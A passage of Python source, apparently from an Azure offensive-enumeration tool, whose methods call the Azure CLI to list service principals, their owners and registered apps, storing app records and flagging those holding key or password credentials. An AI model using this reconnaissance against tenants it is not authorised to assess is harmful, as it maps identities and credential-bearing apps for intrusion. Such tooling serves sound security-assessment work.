            for spn in spn_list_json:

                if spn['appDisplayName'] and spn['appId']:
                    self.logger.highlight("{:<40}  |  {} | {} | {}".format((spn['appDisplayName'][:37] + (spn['appDisplayName'][37:] and '..')),
                                                                 spn['appId'],
                                                                 spn['appOwnerTenantId'],
                                                                 spn['publisherName']))

    def spn_owner_list(self):
        # az ad sp list --all
        spnn_list = subprocess.run(['az','ad', 'sp', 'list', '--all', '--query', '[].{appDisplayName:appDisplayName, appId:appId, appOwnerTenantId:appOwnerTenantId}'], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            spn_list_json = json.loads(spnn_list.stdout.decode(self.decoder))
        except:
            self.logger.error("Current user has no VM subscriptions")
            return

        self.logger.info("Getting SPN Info")

        if self.args.full:
            pprint.pprint(spn_list_json)
        else:
            self.logger.highlight("{:<40}  |      {:<32} |   {}".format('    associated-app', '         appId', '         appOwnerTenantId'))
            for spn in spn_list_json:
                spn_own_list = subprocess.run(['az','ad', 'sp', 'owner', 'list', '--id', spn['appId']], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                try:
                    spn_own_list_json = json.loads(spn_own_list.stdout.decode(self.decoder))
                except:
                    self.logger.error("Error getting owner list")
                    return
                print("app:{}".format(spn['appDisplayName']))
                pprint.pprint(spn_own_list_json)


    def spn(self):
        # az ad sp list --all --query [].{appDisplayName:appDisplayName, appId:appId, appOwnerTenantId:appOwnerTenantId}
        spnn_list = subprocess.run(['az','ad', 'sp', 'list', '--all', '--query', '[].{appDisplayName:appDisplayName, appId:appId, appOwnerTenantId:appOwnerTenantId}'], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            spn_list_json = json.loads(spnn_list.stdout.decode(self.decoder))
        except:
            decode_fail = True
            pass
        # this added try/catch is because windows is F'd
        try:
            if decode_fail:
                spn_list_json = json.loads(spnn_list.stdout.decode('cp1252'))
        except:
            self.logger.error("Current user has no VM subscriptions")
            return

        self.logger.info("Getting SPN Info")

        if self.args.full:
            pprint.pprint(spn_list_json)
        else:
            self.logger.highlight("{:<40}  |      {:<32} |   {}".format('    associated-app', '         appId', '         appOwnerTenantId'))
            for spn in spn_list_json:

                if spn['appDisplayName'] and spn['appId']:
                    self.logger.highlight("{:<40}  |  {} | {}".format((spn['appDisplayName'][:37] + (spn['appDisplayName'][37:] and '..')),
                                                                 spn['appId'],
                                                                 spn['appOwnerTenantId']))

    def spn_mine(self):
        # az ad sp list --show-mine
        spnn_list = subprocess.run(['az','ad', 'sp', 'list', '--show-mine'], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        #spnn_list = subprocess.run(['az','ad', 'sp', 'list', '--show-mine', '--query', '[].{appDisplayName:appDisplayName, appId:appId, appOwnerTenantId:appOwnerTenantId}'], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            spn_list_json = json.loads(spnn_list.stdout.decode(self.decoder))
        except:
            self.logger.error("Current user has no VM subscriptions")
            return

        self.logger.info("Getting SPN Info For Current User")

        if self.args.full:
            pprint.pprint(spn_list_json)
        else:
            self.logger.highlight("{:<40}  |      {:<32} |   {}".format('    associated-app', '         appId', '         appOwnerTenantId'))

            for spn in spn_list_json:

                if spn['appDisplayName'] and spn['appId']:
                    self.logger.highlight("{:<40}  |  {} | {}".format((spn['appDisplayName'][:37] + (spn['appDisplayName'][37:] and '..')),
                                                                 spn['appId'],
                                                                 spn['appOwnerTenantId']))


###############################################################################

               #       ######     ######
              # #      #     #    #     #
             #   #     #     #    #     #
            #     #    ######     ######
            #######    #          #
            #     #    #          #
            #     #    #          #

###############################################################################
###############################################################################
#
#
#
#
###############################################################################


    def app_list(self):

        #app_list = subprocess.run(['az','ad', 'app', 'list', '--all', '--query', '[].{DisplayName:displayName, appId:appId, homepage:homepage}'], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        app_list = subprocess.run(['az','ad', 'app', 'list', '--all'], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            app_list_json = json.loads(app_list.stdout.decode(self.decoder))
        except:
            self.logger.error("Current user has no VM subscriptions")
            return

        if self.args.full:
            pprint.pprint(app_list_json)
            return

        self.logger.highlight("{:<35}     {:<35}    {}     {}  ".format('     displayName',
                                                                        'homepage',
                                                                        'keyProps',
                                                                        'passwordProps' ))
        for app in app_list_json:
            #self.db.add_app(str(app['displayName']), str(app['appId']), str(app['homepage']), str(app['objectId']), str(app['allowGuestsSignIn']), str(app['keyCredentials']), str(app['passwordCredentials']), str(app['wwwHomepage']) )
            self.db.add_app(app)
            if not self.args.full:
                self.logger.highlight("{:<35}  |  {:<35}  | {:<9}  |  {:<}".format((app['displayName'][:33] + (app['displayName'][33:] and '..')),
                                                                                  ((app['homepage'][:33] + (app['homepage'][33:] and '..')) if app['homepage'] else ' '),
                                                                                  ('CheckDB' if app['keyCredentials'] else ' '),
                                                                                  ('CheckDB' if app['passwordCredentials'] else ' ') ) )
